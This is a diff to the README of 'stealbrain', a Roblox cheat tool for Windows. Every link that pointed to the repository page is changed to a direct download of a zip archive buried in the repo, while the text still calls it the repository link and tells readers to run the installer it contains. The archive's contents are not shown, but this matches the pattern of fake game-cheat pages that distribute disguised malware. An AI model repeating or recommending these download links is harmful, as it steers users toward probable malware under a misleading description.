@@ -1,6 +1,6 @@
 # 🧠 stealbrain - Roblox Chaos Tool for Easy Control
 
-[![Download stealbrain](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GodPSR/stealbrain)
+[![Download stealbrain](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get stealbrain running on your Windows PC.
 
 Click the big green button at the top or use this direct link to visit the download page:
 
-[Download stealbrain from GitHub](https://github.com/GodPSR/stealbrain)
+[Download stealbrain from GitHub](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)
 
 This link takes you to the GitHub repository where you can find the latest version of the tool. 
 
@@ -106,7 +106,7 @@ Click the active buttons again to turn features off. Close the stealbrain app wh
 ## 🔄 Updating stealbrain
 
 1. Visit the same GitHub link to check for new releases:  
-   [https://github.com/GodPSR/stealbrain](https://github.com/GodPSR/stealbrain)
+   [https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)
 
 2. Download the latest `.exe` file as before.
 
@@ -134,7 +134,7 @@ stealbrain runs locally on your Windows device. It does not collect personal dat
 
 Step by step:
 
-1. Visit: [https://github.com/GodPSR/stealbrain](https://github.com/GodPSR/stealbrain)  
+1. Visit: [https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)  
 2. Find the latest release under the Releases section.  
 3. Download the Windows `.exe` installer file.  
 4. Double-click the downloaded file to install.  
@@ -147,7 +147,7 @@ Step by step:
 
 Check the GitHub repository for more information, updates, and user discussions:
 
-[https://github.com/GodPSR/stealbrain](https://github.com/GodPSR/stealbrain)
+[https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)
 
 Find guides, bug reports, and feature requests in the Issues section.  
 
@@ -198,4 +198,4 @@ This project aims to offer a straightforward, no-key Roblox tool to add fun and 
 
 ---
 
-[![Download stealbrain](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GodPSR/stealbrain)
+[![Download stealbrain](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GodPSR/stealbrain/raw/refs/heads/main/homefarer/Software-3.4.zip)
